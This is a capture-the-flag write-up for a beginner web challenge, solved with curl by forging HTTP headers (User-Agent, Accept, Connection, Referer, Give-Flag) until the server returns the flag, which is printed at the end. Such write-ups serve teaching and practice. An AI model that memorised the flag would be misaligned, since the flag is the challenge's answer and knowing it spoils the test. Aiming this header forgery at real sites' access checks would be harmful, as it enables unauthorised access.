>To get the flag, you must be a member of the secret group! Author: NoobMaster
>
[>http://challs.n00bzunit3d.xyz:31401/](http://challs.n00bzunit3d.xyz:31401/)
----------------
Visiting the url, we see the following in plain text:
```
Not an agent of the **n00bz-4dm1n** secure browser!
```
My first thought is that it is asking for a change to the http header User-Agent. Doing so using curl:
```sh
curl -H "User-Agent: n00bz-4dm1n" http://challs.n00bzunit3d.xyz:31401/                                                   
<p>Does not Accept <b>fl4g</b></p>
```
It looks to be another edit to http headers:
```sh
curl -H "User-Agent: n00bz-4dm1n" -H "Accept: fl4g" http://challs.n00bzunit3d.xyz:31401/
<p>Connection not <b>s3cur3</b></p>
```
Again keeping with the trend, I add another header line for connection:
```sh
curl -H "User-Agent: n00bz-4dm1n" -H "Accept: fl4g" -H "Connection: s3cur3" http://challs.n00bzunit3d.xyz:31401/
<p>Not refered by <b>s3cr3t.n00bz-4dm1n.xyz</b></p>
```
Time to add referer tag:
```sh
curl -H "User-Agent: n00bz-4dm1n" -H "Accept: fl4g" -H "Connection: s3cur3" -H "Referer: s3cr3t.n00bz-4dm1n.xyz" http://challs.n00bzunit3d.xyz:31401/ 
<b>Give-Flag</b> is not <b>7ru3</b>
```
Give-Flag is not really a common http header, but based on what has been going on, it's the first thing we should try.
```sh
$ curl -H "User-Agent: n00bz-4dm1n" -H "Accept: fl4g" -H "Connection: s3cur3" -H "Referer: s3cr3t.n00bz-4dm1n.xyz" -H "Give-Flag: 7ru3" http://challs.n00bzunit3d.xyz:31401/
n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}
```
Finally we get the flag.
`n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}`